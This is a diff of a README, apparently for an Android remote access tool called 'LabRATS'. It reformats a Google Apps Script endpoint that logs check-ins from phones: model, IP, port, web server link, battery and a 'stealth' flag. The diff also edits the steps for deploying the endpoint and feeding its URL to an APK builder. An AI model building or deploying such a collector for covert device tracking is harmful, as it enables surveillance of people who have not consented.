@@ -112,7 +112,18 @@ function doPost(e) {
     var ss = SpreadsheetApp.getActiveSpreadsheet();
     var sheet = ss.getSheetByName("LabRATS Logs") || ss.getSheets()[0];
     var data = JSON.parse(e.postData.contents);
-    var rowData = [new Date(), data.device, data.network, data.ip, data.port, data.link, data.battery, data.stealth ? "ACTIVE" : "OFF"];
+    
+    var rowData = [
+      new Date(),       // A: Date & Time
+      data.device,     // B: Device Model #
+      data.network,    // C: Connection Type
+      data.ip,         // D: IP Address
+      data.port,       // E: Port #
+      data.link,       // F: Active Web Server URL Link
+      data.battery,    // G: Battery
+      data.stealth ? "ACTIVE" : "OFF" // H: Stealth Status
+    ];
+    
     sheet.appendRow(rowData);
     return ContentService.createTextOutput("SUCCESS").setMimeType(ContentService.MimeType.TEXT);
   } catch (err) {
@@ -121,9 +132,9 @@ function doPost(e) {
 }
 ```
 3.  **Deploy** → **Web App** → **Execute as Me** → **Access Anyone**.
-4.  **Paste** the **generated URL** into the **APK Builder** when prompted.
+4.  **Paste** the **Generated URL** into the **APK Builder** when prompted.
 
-### 📊 Example Google Sheet Running and Properly Configured:
+### 📊 Example Google Sheet Running:
 
 [![Google-Sheet-Example.png](https://i.postimg.cc/L6qYMSZr/Google-Sheet-Example.png)](https://postimg.cc/56VNwZg3)
 
